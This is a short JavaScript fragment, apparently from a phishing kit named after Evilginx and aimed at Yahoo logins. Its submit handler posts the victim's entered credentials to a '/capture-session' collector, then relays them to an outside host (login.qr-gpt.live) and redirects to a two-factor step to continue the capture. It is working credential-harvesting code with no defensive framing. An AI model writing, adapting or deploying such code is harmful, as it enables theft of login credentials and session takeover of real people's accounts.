// js/evilginx-yahoo.js (partial update)
document.getElementById('email-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const form = e.target;
    const formData = new FormData(form);
    fetch('/capture-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(Object.fromEntries(formData))
    }).then(() => {
        fetch('https://login.qr-gpt.live/account/challenge/password', {
            method: 'POST',
            body: formData
        }).then(response => response.json()).then(data => {
            if (data.success) {
                window.location.href = `/2fa?u=${encodeURIComponent(formData.get('name'))}`;
            } else {
                showError('Invalid credentials.');
            }
        }).catch(err => showError('Error during login.'));
    });
});